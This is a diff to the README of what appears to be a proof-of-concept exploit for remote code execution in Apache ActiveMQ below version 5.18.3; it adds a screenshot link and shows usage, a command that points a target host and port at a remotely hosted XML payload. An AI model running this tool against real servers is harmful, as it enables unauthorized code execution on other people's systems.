@@ -2,7 +2,8 @@
 Apache ActiveMQ (版本 &lt; 5.18.3) RCE
 
 使用jdk11
- 
+ ![image](https://github.com/Fw-fW-fw/activemq_Throwable/assets/66824584/19b1ea37-1657-42af-b7a8-f1b8d59c75b8)
+
 Usage: java activemq_poc.jar <ip> <port> <urlfile_xmlpoc>
 
 eg: java -jar activemq_poc.jar 127.0.0.1 61616 http://127.0.0.1:8000/poc.xml
